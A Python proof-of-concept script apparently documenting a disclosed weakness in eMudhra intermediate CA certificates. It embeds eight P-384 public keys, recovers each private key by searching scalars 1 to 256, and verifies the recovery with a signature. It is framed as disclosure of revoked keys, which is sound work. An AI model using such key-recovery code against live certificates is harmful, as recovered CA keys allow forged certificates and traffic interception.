#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# The script:
#   1. FETCHES the public disclosure feed of impacted intermediates
#      (emudhra.we-have-a-problem.com/impacted-intermediates.json), which carries
#      each compromised certificate as PEM plus its revocation metadata.
#   2. Parses each certificate's PUBLIC key (P-384 / secp384r1).
#   3. RECOVERS the private key by searching d = 1..256 for d*G == public key.
#   4. Verifies each recovery by signing under the key as published in the cert.
#
# All inputs are public and the keys are revoked (cACompromise): 
# this documents a public failure. It does not attack anything.
#
# Requires: cryptography  (pip install cryptography). 
# ---------------------------------------------------------------------------

import hashlib
import json
import ssl
import time
import urllib.request
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec

FEED_URL = "https://emudhra.we-have-a-problem.com/impacted-intermediates.json"
SEARCH_MAX = 256
TIMEOUT = 30

# Offline fallback: the eight public keys as published in the certificates
# (uncompressed EC points, P-384), used only if the live feed is unreachable.
OFFLINE_POINTS = [
    ("EM OV TLS CA - G3C", "04138251cd52ac9298c1c8aad977321deb97e709bd0b4ca0aca55dc8ad51dcfc9d1589a1597e3a5120e1efd631c63e1835cacae29869a62e1631e8a28181ab56616dc45d918abc09f3ab0e63cf792aa4dced7387be37bba569549f1c02b270ed67"),
    ("EM EV TLS CA - G3C", "042d56e829a6fb82c64a4697d960af951e9067ae91f926d34306da48a8aaeb7869b6a67e6d27426e0442aa03b36e1988dff636514ee1cf07f5ba4b3ff2a06645ae7d31d5866ad31aa3d246eb0b3177ee99cb7566c516ce74808a668f91f0c47fca"),
    ("EM OV CS CA - G3B",  "04aabb0fb0666acfcf01fad52bfcfd4c2bf2cb3c3497de73950e5819b61fe695098741c8c491439b34a0431caffe5bf9b4c1c8e8ae0001f9f4dc8ad82c59f3639e96cd6c3d4db0cefec26c3d62517b37761372743f8e8add77b10064f2abe5e050"),
    ("EM EV TLS CA - G3B",  "0425dba85a64d397da0b1052e9ea546e487befea9c9d9d68a0c5eadcfeef75a69bb5d6fc01f42bfbca6eb40bcd64c0767e36ffd05d97a813c5aa0c6c9530e79cf5f0866468f13806420aa5c851840b1e252540e790e4b654c3852ed64af1e8657d"),
    ("EM OV TLS CA - G3B",  "0473897aa0eb3cfdca8b12402ffaf0abc4e1212baf8dee778ac9ee2d6db83fac280c5e05638ae7a2acd71c322a8e361cdeb9f69c4302b9dd8d73d1cc6caab2cc0aee4e216ce979dd518a4af4b626e5684cdd658037ed0c854e4cc12f4cf8646d0d"),
    ("EM DV TLS CA - G3B",  "04e79ed9c04a9773c4735e51111da85ac2bd5e64ab374b80e12cbc2038ec1e4f0e3b812fc9859e1e67afb04e2f8bc97f7485ba65aa911ee8a4e45b62d5cc03d56be678b3c38cb4dc937ca2460e238453c892935d29d44f91e15606b63ccedab468"),
    ("EM DV TLS CA - G3C",  "043a7a7862c8c44d324ddd69033a6782c0efeefe4055e68a123fa0371ba3bd9194514ee172a433e3630f02bd188037d9e5149f9b77db94a281df987b2fea888b74bdfe8fda4c1099ee6ca19566fe3ef0e5f6b09a556ccc8ba50561df1b2a441d01"),
    ("EM OV CS CA - G3C",  "04b9f0e0634702a69ca6aadd443cfd62c41b9ba4b20924697d7974e7691a126fb96afb3e34c2fd3bc5f483061f265dc2a58436347323510436b28f04f3862363067980e2503e02532d6546235a7165a259a1ef496f741b5fdee7787208e4b8faef"),
]


def fetch_feed(url: str):
    """Download and parse the public disclosure feed."""
    ctx = ssl.create_default_context()
    req = urllib.request.Request(url, headers={"User-Agent": "weak-key-proof/1.0"})
    with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as resp:
        return json.load(resp)


def recover_private_scalar(public_key) -> int | None:
    """Search d = 1..SEARCH_MAX for d*G == public_key. Return d or None."""
    target = public_key.public_numbers()
    for d in range(1, SEARCH_MAX + 1):
        if ec.derive_private_key(d, public_key.curve).public_key().public_numbers() == target:
            return d
    return None


def spki_hash(pub) -> str:
    der = pub.public_bytes(serialization.Encoding.DER,
                           serialization.PublicFormat.SubjectPublicKeyInfo)
    return hashlib.sha256(der).hexdigest().upper()


def load_records():
    try:
        print(f"Fetching live disclosure feed:\n  {FEED_URL}")
        feed = fetch_feed(FEED_URL)
        records = []
        for e in feed:
            if not e.get("pem"):
                continue
            pub = x509.load_pem_x509_certificate(e["pem"].encode()).public_key()
            if isinstance(pub, ec.EllipticCurvePublicKey):
                records.append({
                    "name": e.get("name", "?"),
                    "pub": pub,
                    "issuer": e.get("issuer", "?"),
                })
        print(f"  live feed OK: {len(feed)} records, {len(records)} ECC certs\n")
        return records
    except Exception as exc:
        print(f"  live fetch failed ({exc}); using embedded offline public keys\n")
        return [{
            "name": name,
            "pub": ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP384R1(), bytes.fromhex(pt)),
            "issuer": "(offline: public key only)",
        } for name, pt in OFFLINE_POINTS]


def issuer_cn(dn: str) -> str:
    """Pull a short CN=... label out of an issuer DN for compact display."""
    for part in dn.replace(", ", ",").split(","):
        if part.startswith("CN="):
            return part[3:]
    return dn


def main() -> int:
    entries = load_records()

    # Group certificate records by key (SPKI), so each distinct key is one row.
    keys = {}
    for rec in entries:
        keys.setdefault(spki_hash(rec["pub"]), []).append(rec)

    recovered = 0
    for spki, certs in keys.items():
        pub = certs[0]["pub"]
        name = certs[0]["name"]
        if name.startswith("EM "):
            name = "eMudhra " + name[3:]

        t0 = time.perf_counter()
        d = recover_private_scalar(pub)
        dt = (time.perf_counter() - t0) * 1000

        if d is None:
            print(f"[SAFE] {name}: no key <= {SEARCH_MAX} ({pub.curve.name})")
            continue

        # Confirm: sign with recovered key, verify under the published key.
        challenge = b"live-recovery-check: " + spki.encode()
        sig = ec.derive_private_key(d, pub.curve).sign(challenge, ec.ECDSA(hashes.SHA384()))
        try:
            pub.verify(sig, challenge, ec.ECDSA(hashes.SHA384()))
            verified = True
        except Exception:
            verified = False
        recovered += 1 if verified else 0

        issuers = sorted({issuer_cn(c["issuer"]) for c in certs})
        print(f"{name}  ({pub.curve.name}, {dt:.1f} ms, verified={verified})")
        print(f"        SPKI {spki}")
        print(f"        carried by {len(certs)} cert(s), issued by: {', '.join(issuers)}")
        print(f"        private key recovered: d = {d}")

    print()
    print(f"RESULT: recovered {recovered}/{len(keys)} distinct private keys "
          f"from public certificates by a {SEARCH_MAX}-value search.")
    return 0 if recovered else 1


if __name__ == "__main__":
    raise SystemExit(main())
